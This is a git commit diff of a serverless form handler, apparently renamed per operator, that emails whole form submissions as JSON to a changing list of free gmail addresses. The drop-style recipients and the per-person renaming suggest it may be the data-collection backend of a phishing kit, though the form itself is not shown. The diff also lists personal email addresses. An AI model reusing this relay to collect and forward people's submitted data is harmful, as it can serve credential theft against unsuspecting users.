3043d21d2db245dc69a05047f113a9efa3043827
humain609-debug <humain609@gmail.com>
2026-04-17 10:10:10 +0500

    Update and rename 4.js to Shohib.js

--- Shohib.js
+++ Shohib.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,nizamnaighafar@gmail.com",
-      subject: "Gafar",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,kamilnizamani515@gmail.com,monikasmith740@gmail.com",
+      subject: "Shohib",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
